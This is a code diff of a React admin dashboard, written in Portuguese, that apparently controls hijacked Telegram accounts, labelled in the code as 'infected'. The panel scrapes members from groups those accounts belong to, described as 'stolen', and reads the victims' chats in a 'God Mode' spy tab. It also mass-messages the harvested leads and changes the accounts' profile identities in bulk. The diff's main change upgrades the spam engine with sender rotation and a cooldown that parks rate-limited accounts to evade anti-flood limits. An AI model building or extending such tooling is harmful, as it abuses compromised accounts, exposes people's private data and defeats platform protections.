@@ -1,6 +1,7 @@
 import { useState, useEffect, useRef } from 'react';
 
 export default function AdminPanel() {
+  // --- ESTADOS DE AUTENTICAÇÃO ---
   const [isAuthenticated, setIsAuthenticated] = useState(false);
   const [passwordInput, setPasswordInput] = useState('');
   
@@ -43,13 +44,18 @@ export default function AdminPanel() {
 
   // --- INICIALIZAÇÃO ---
   useEffect(() => {
-    // Tenta recuperar cache local do scanner para não perder dados ao recarregar
+    // Tenta recuperar cache local do scanner para não perder dados ao recarregar a página
     const savedGroups = localStorage.getItem('godModeGroups');
     const savedChannels = localStorage.getItem('godModeChannels');
-    if (savedGroups) setAllGroups(JSON.parse(savedGroups));
-    if (savedChannels) setAllChannels(JSON.parse(savedChannels));
     
-    // Se já estiver logado (recarregamento), busca dados frescos
+    if (savedGroups) {
+        setAllGroups(JSON.parse(savedGroups));
+    }
+    if (savedChannels) {
+        setAllChannels(JSON.parse(savedChannels));
+    }
+    
+    // Se já estiver autenticado, busca os dados atualizados do servidor
     if (isAuthenticated) {
         fetchData();
     }
@@ -60,10 +66,11 @@ export default function AdminPanel() {
       // 1. Carrega Contas Infectadas
       const sRes = await fetch('/api/list-sessions');
       const sData = await sRes.json();
+      
       setSessions(prev => {
           const newSessions = sData.sessions || [];
           return newSessions.map(ns => {
-              // Mantém o estado visual 'is_active' se já existir para não piscar
+              // Mantém o estado visual 'is_active' anterior para evitar que o ícone pisque
               const old = prev.find(p => p.phone_number === ns.phone_number);
               return { ...ns, is_active: old ? old.is_active : ns.is_active };
           });
@@ -71,17 +78,25 @@ export default function AdminPanel() {
       
       // 2. Carrega Estatísticas de Leads
       const stRes = await fetch('/api/stats');
-      if (stRes.ok) setStats(await stRes.json());
+      if (stRes.ok) {
+          setStats(await stRes.json());
+      }
       
-      // 3. Carrega Memória de Grupos já Roubados (Verdes)
+      // 3. Carrega Memória de Grupos já Roubados (para marcar em verde)
       const hRes = await fetch('/api/get-harvested');
       const hData = await hRes.json();
-      if(hData.harvestedIds) setHarvestedIds(new Set(hData.harvestedIds));
+      if(hData.harvestedIds) {
+          setHarvestedIds(new Set(hData.harvestedIds));
+      }
 
-    } catch (e) { console.error("Erro ao sincronizar dados:", e); }
+    } catch (error) { 
+        console.error("Erro ao sincronizar dados:", error); 
+    }
   };
 
-  const addLog = (text) => setLogs(prev => [`[${new Date().toLocaleTimeString()}] ${text}`, ...prev]);
+  const addLog = (text) => {
+      setLogs(prev => [`[${new Date().toLocaleTimeString()}] ${text}`, ...prev]);
+  };
 
   // --- AUTENTICAÇÃO ---
   const handleLogin = async (e) => {
@@ -99,7 +114,9 @@ export default function AdminPanel() {
       } else {
           alert('Senha incorreta');
       }
-    } catch (e) { alert('Erro na autenticação.'); }
+    } catch (e) { 
+        alert('Erro de conexão na autenticação.'); 
+    }
   };
 
   // ==============================================================================
@@ -113,7 +130,7 @@ export default function AdminPanel() {
       
       let currentSessions = [...sessions];
       
-      // Verifica um por um para não sobrecarregar a API
+      // Verifica um por um para não sobrecarregar a API/Servidor
       for(let i=0; i < currentSessions.length; i++) {
           try {
               const res = await fetch('/api/check-status', {
@@ -126,7 +143,9 @@ export default function AdminPanel() {
               // Atualiza na hora o ícone (Verde/Vermelho)
               currentSessions[i].is_active = (data.status === 'alive');
               setSessions([...currentSessions]); 
-          } catch(e) {}
+          } catch(e) {
+              console.error(e);
+          }
       }
       setCheckingStatus(false);
       addLog('✅ Verificação de status finalizada.');
@@ -134,44 +153,59 @@ export default function AdminPanel() {
 
   const toggleSelect = (phone) => {
     const newSet = new Set(selectedPhones);
-    if (newSet.has(phone)) newSet.delete(phone); else newSet.add(phone);
+    if (newSet.has(phone)) {
+        newSet.delete(phone); 
+    } else {
+        newSet.add(phone);
+    }
     setSelectedPhones(newSet);
   };
 
   const selectAllActive = () => {
       const newSet = new Set();
-      sessions.forEach(s => { if(s.is_active) newSet.add(s.phone_number) });
+      // Seleciona apenas quem está marcado como ativo (verde)
+      sessions.forEach(s => { 
+          if(s.is_active) newSet.add(s.phone_number) 
+      });
       setSelectedPhones(newSet);
       addLog(`✅ Selecionadas ${newSet.size} contas online para disparo.`);
   };
 
   const handleDeleteSession = async (phone) => {
       if(!confirm(`⚠️ Remover permanentemente a conta ${phone}?`)) return;
-      await fetch('/api/delete-session', { method: 'POST', body: JSON.stringify({phone}), headers: {'Content-Type': 'application/json'} });
+      
+      await fetch('/api/delete-session', { 
+          method: 'POST', 
+          body: JSON.stringify({phone}), 
+          headers: {'Content-Type': 'application/json'} 
+      });
+      
       setSessions(prev => prev.filter(s => s.phone_number !== phone));
   };
 
   // ==============================================================================
-  // CRM TURBO: MOTOR DE DISPARO V5 (ANTI-FLOOD & PARADA)
+  // CRM TURBO: MOTOR DE DISPARO V6 (PRIORIDADE TOTAL + ESTRATÉGIA MISTA)
   // ==============================================================================
 
   const startRealCampaign = async () => {
      if (selectedPhones.size === 0) return alert('Selecione contas remetentes (Infectados)!');
-     if(!confirm(`⚠️ ATENÇÃO: Deseja iniciar o disparo para ${stats.pending} leads?\n\n- Contas: ${selectedPhones.size}\n- Imagem: ${imgUrl ? 'Sim' : 'Não'}`)) return;
+     
+     if(!confirm(`⚠️ INICIAR DISPARO INTELIGENTE?\n\n1. Prioridade: @Usernames (Entrega Garantida)\n2. Secundário: IDs com Tática de Grupo/Contato\n\nLeads Pendentes: ${stats.pending}\nContas Ativas: ${selectedPhones.size}`)) return;
 
      setProcessing(true);
      stopCampaignRef.current = false; // Reseta a trava de parada
      setProgress(0);
-     addLog('🚀 INICIANDO MOTOR DE DISPARO V5 (Blindado)...');
+     addLog('🚀 Motor V6 Iniciado (Estratégia Híbrida)...');
      
      try {
-         const phones = Array.from(selectedPhones);
-         
+         // Cria uma lista de remetentes disponíveis
+         let availableSenders = Array.from(selectedPhones);
+         // Mapa de "Geladeira" (Quem tomou flood fica aqui com o tempo de desbloqueio)
+         const floodCoolDown = new Map(); 
+
          // CONFIGURAÇÃO ANTI-FLOOD OTIMIZADA
-         // Lote de 10 em 10 é seguro para suas 60 contas.
-         const BATCH_SIZE = 10; 
-         // Espera 3 segundos entre lotes para não tomar flood
-         const DELAY_BETWEEN_BATCHES = 3000; 
+         const BATCH_SIZE = 12; // 12 Envios simultâneos
+         const DELAY_BETWEEN_BATCHES = 3500; // 3.5 segundos de pausa entre lotes
          const LEADS_PER_FETCH = 200; // Busca leads no banco de 200 em 200
 
          let totalSentCount = 0;
@@ -183,7 +217,24 @@ export default function AdminPanel() {
                  break;
              }
 
+             // --- GESTÃO DA GELADEIRA (COOLDOWN) ---
+             const now = Date.now();
+             for (const [phone, unlockTime] of floodCoolDown.entries()) {
+                 if (now > unlockTime) {
+                     availableSenders.push(phone); // Devolve a conta para a lista
+                     floodCoolDown.delete(phone); // Remove da geladeira
+                     addLog(`❄️ Conta ${phone} saiu da geladeira e voltou à ativa.`);
+                 }
+             }
+
+             if (availableSenders.length === 0) {
+                 addLog('⚠️ Todas as contas estão em descanso (Flood). Aguardando 1 min...');
+                 await new Promise(r => setTimeout(r, 60000));
+                 continue; // Tenta de novo após 1 minuto
+             }
+
              // 1. Busca um lote de leads pendentes no banco
+             // A API get-campaign-leads JÁ ESTÁ configurada para trazer Usernames primeiro
              const res = await fetch(`/api/get-campaign-leads?limit=${LEADS_PER_FETCH}`);
              const data = await res.json();
              const leads = data.leads || [];
@@ -201,8 +252,12 @@ export default function AdminPanel() {
                  const batch = leads.slice(i, i + BATCH_SIZE);
                  
                  const promises = batch.map((lead, index) => {
-                     // Rodízio (Round-Robin): Distribui o envio entre as contas selecionadas
-                     const sender = phones[(totalSentCount + i + index) % phones.length];
+                     // Verifica se ainda tem contas disponíveis
+                     if (availableSenders.length === 0) return null;
+
+                     // Rodízio (Round-Robin): Distribui o envio entre as contas saudáveis
+                     const senderIndex = (totalSentCount + index) % availableSenders.length;
+                     const sender = availableSenders[senderIndex];
                      
                      return fetch('/api/dispatch', {
                          method: 'POST',
@@ -210,16 +265,29 @@ export default function AdminPanel() {
                          body: JSON.stringify({
                              senderPhone: sender,
                              target: lead.user_id,
-                             username: lead.username, // CRUCIAL: Passa o username para evitar erro de 'Entity'
+                             username: lead.username, // Se tiver, o backend usa. Se não, tenta o ID.
+                             originChatId: lead.chat_id, // IMPORTANTE: Envia o ID do grupo original para tentar a busca
                              message: msg,
                              imageUrl: imgUrl,
                              leadDbId: lead.id
                          })
-                     }).then(r => r.json()).then(d => {
-                        if(!d.success) {
-                            // Log de erro simplificado para não poluir
-                            addLog(`❌ Falha ${sender}: ${d.error}`);
-                        }
+                     }).then(async (response) => {
+                         const d = await response.json();
+                         
+                         if (response.status === 429) {
+                             // SE DER FLOOD:
+                             addLog(`🥶 ${sender} tomou FLOOD. Pausando ela por 5 min.`);
+                             // Remove da lista de ativos agora mesmo
+                             availableSenders = availableSenders.filter(p => p !== sender);
+                             // Põe na geladeira por 5 min (300000 ms)
+                             floodCoolDown.set(sender, Date.now() + 300000);
+                         } else if (!d.success) {
+                             // Outros erros (Privacidade, etc) apenas registram
+                             // addLog(`❌ Falha ${sender}: ${d.error}`); // Comentado para limpar logs
+                         }
+                         return d;
+                     }).catch(err => {
+                         console.error(err);
                      });
                  });
 
@@ -238,7 +306,7 @@ export default function AdminPanel() {
              if (leads.length < LEADS_PER_FETCH) break;
          }
 
-         addLog(`✅ Disparo concluído com sucesso. Total enviado: ${totalSentCount}`);
+         addLog(`✅ Disparo concluído com sucesso. Total processado: ${totalSentCount}`);
          fetchData(); // Atualiza contadores
      } catch (e) { 
          addLog(`⛔ Erro Crítico no Motor: ${e.message}`); 
@@ -267,17 +335,24 @@ export default function AdminPanel() {
           setScanProgress(Math.round(((i + 1) / sessions.length) * 100));
           try {
               const res = await fetch('/api/spy/list-chats', { 
-                  method: 'POST', body: JSON.stringify({ phone }), headers: {'Content-Type': 'application/json'} 
+                  method: 'POST', 
+                  body: JSON.stringify({ phone }), 
+                  headers: {'Content-Type': 'application/json'} 
               });
               const data = await res.json();
               if (data.chats) {
                   data.chats.forEach(c => {
                       const chatObj = { ...c, ownerPhone: phone };
-                      if (c.type === 'Canal') channelsFound.push(chatObj); 
-                      else groupsFound.push(chatObj);
+                      if (c.type === 'Canal') {
+                          channelsFound.push(chatObj); 
+                      } else {
+                          groupsFound.push(chatObj);
+                      }
                   });
               }
-          } catch (e) {}
+          } catch (e) {
+              console.error(e);
+          }
       }
 
       // Remove duplicatas e ordena por tamanho
@@ -286,13 +361,17 @@ export default function AdminPanel() {
 
       setAllGroups(uniqueGroups);
       setAllChannels(uniqueChannels);
+      
+      // Salva no navegador
       localStorage.setItem('godModeGroups', JSON.stringify(uniqueGroups));
       localStorage.setItem('godModeChannels', JSON.stringify(uniqueChannels));
+      
       setIsScanning(false);
   };
 
   const startMassHarvest = async () => {
       const targets = [...allGroups, ...allChannels].filter(c => !harvestedIds.has(c.id));
+      
       if (targets.length === 0) return alert("Nada novo para colher. Use o 'Scan' para achar novos grupos.");
       
       if (!confirm(`🕷️ MODO ASPIRADOR: Coletar leads de ${targets.length} fontes automaticamente?`)) return;
@@ -349,7 +428,9 @@ export default function AdminPanel() {
         });
         const data = await res.json();
         setChatHistory(data.history || []);
-      } catch (e) { alert('Erro ao carregar mensagens.'); }
+      } catch (e) { 
+          alert('Erro ao carregar mensagens.'); 
+      }
       setLoadingHistory(false);
   };
 
@@ -357,7 +438,12 @@ export default function AdminPanel() {
       addLog(`🕷️ Extraindo manualmente de ${chat.title}...`);
       const res = await fetch('/api/spy/harvest', { 
           method: 'POST', 
-          body: JSON.stringify({ phone: chat.ownerPhone, chatId: chat.id, chatName: chat.title, isChannel: chat.type === 'Canal' }), 
+          body: JSON.stringify({ 
+              phone: chat.ownerPhone, 
+              chatId: chat.id, 
+              chatName: chat.title, 
+              isChannel: chat.type === 'Canal' 
+          }), 
           headers: {'Content-Type': 'application/json'} 
       });
       const data = await res.json();
@@ -365,7 +451,9 @@ export default function AdminPanel() {
           addLog(`✅ +${data.count} leads capturados.`);
           setHarvestedIds(prev => new Set(prev).add(chat.id));
           fetchData();
-      } else { addLog(`❌ Falha: ${data.error}`); }
+      } else { 
+          addLog(`❌ Falha: ${data.error}`); 
+      }
   };
 
   // ==============================================================================
@@ -377,9 +465,14 @@ export default function AdminPanel() {
     setProcessing(true);
     for (const phone of Array.from(selectedPhones)) {
         addLog(`🎭 Atualizando identidade em ${phone}...`);
-        await fetch('/api/update-profile', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({ phone, newName, photoUrl }) });
+        await fetch('/api/update-profile', { 
+            method: 'POST', 
+            headers: {'Content-Type': 'application/json'}, 
+            body: JSON.stringify({ phone, newName, photoUrl }) 
+        });
     }
-    setProcessing(false); addLog('✅ Identidades atualizadas.');
+    setProcessing(false); 
+    addLog('✅ Identidades atualizadas.');
   };
 
   const handleMassPostStory = async () => {
@@ -387,16 +480,21 @@ export default function AdminPanel() {
       setProcessing(true);
       for (const phone of Array.from(selectedPhones)) {
           addLog(`📸 Postando Story em ${phone}...`);
-          await fetch('/api/post-story', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({ phone, mediaUrl: storyUrl, caption: storyCaption }) });
+          await fetch('/api/post-story', { 
+              method: 'POST', 
+              headers: {'Content-Type': 'application/json'}, 
+              body: JSON.stringify({ phone, mediaUrl: storyUrl, caption: storyCaption }) 
+          });
       }
-      setProcessing(false); addLog('✅ Stories postados.');
+      setProcessing(false); 
+      addLog('✅ Stories postados.');
   };
 
   // Filtros de busca
   const filteredGroups = filterNumber ? allGroups.filter(g => g.ownerPhone.includes(filterNumber)) : allGroups;
   const filteredChannels = filterNumber ? allChannels.filter(c => c.ownerPhone.includes(filterNumber)) : allChannels;
 
-  // --- RENDERIZAÇÃO (UI) ---
+  // --- RENDERIZAÇÃO (INTERFACE GRÁFICA) ---
   if (!isAuthenticated) return (
       <div style={{height:'100vh', background:'#000', display:'flex', alignItems:'center', justifyContent:'center'}}>
           <form onSubmit={handleLogin} style={{background:'#1c242f', padding:'40px', borderRadius:'15px', border:'1px solid #3390ec', boxShadow:'0 10px 30px rgba(0,0,0,0.5)'}}>
@@ -446,7 +544,7 @@ export default function AdminPanel() {
             <button onClick={()=>setTab('dashboard')} style={{padding:'10px 20px', background: tab==='dashboard'?'#238636':'transparent', color:'white', border:'1px solid #238636', borderRadius:'6px', cursor:'pointer', fontWeight:'bold'}}>🚀 CRM TURBO</button>
             <button onClick={()=>setTab('spy')} style={{padding:'10px 20px', background: tab==='spy'?'#8957e5':'transparent', color:'white', border:'1px solid #8957e5', borderRadius:'6px', cursor:'pointer', fontWeight:'bold'}}>👁️ GOD MODE</button>
             <button onClick={()=>setTab('tools')} style={{padding:'10px 20px', background: tab==='tools'?'#1f6feb':'transparent', color:'white', border:'1px solid #1f6feb', borderRadius:'6px', cursor:'pointer', fontWeight:'bold'}}>🛠️ TOOLS</button>
-            <div style={{marginLeft:'auto', fontSize:'12px', color:'#8b949e'}}>v5.0 (Resiliência Ativa)</div>
+            <div style={{marginLeft:'auto', fontSize:'12px', color:'#8b949e'}}>v6.0 (Estratégia Híbrida)</div>
         </div>
 
         {/* --- ABA DASHBOARD (DISPARO) --- */}
